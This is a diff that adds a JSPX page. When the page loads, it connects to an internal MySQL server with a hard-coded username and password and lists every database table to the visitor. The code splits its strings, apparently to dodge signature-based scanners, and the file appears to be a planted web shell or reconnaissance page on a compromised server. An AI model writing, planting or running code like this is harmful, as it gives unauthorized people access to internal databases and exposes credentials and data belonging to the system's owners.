@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+<jsp:scriptlet>
+String url = "jdbc:" + "mysql://10.1.1.241:3306/move?useUnicode=true&characterEncoding=UTF-8&useSSL=false";
+try { Class.forName("com." + "mysql.jdbc.Driver"); } catch (Throwable t) { try { Class.forName("com." + "mysql.cj.jdbc.Driver"); } catch (Throwable t2) {} }
+java.sql.Connection c = java.sql.DriverManager.getConnection(url, "myuser", "Boxinkeji168!");
+java.sql.Statement st = c.createStatement();
+java.sql.ResultSet rs = st.executeQuery("SHOW " + "TABLES");
+while (rs.next()) out.print(rs.getString(1) + "\n");
+rs.close(); st.close(); c.close();
+</jsp:scriptlet>
+</jsp:root>
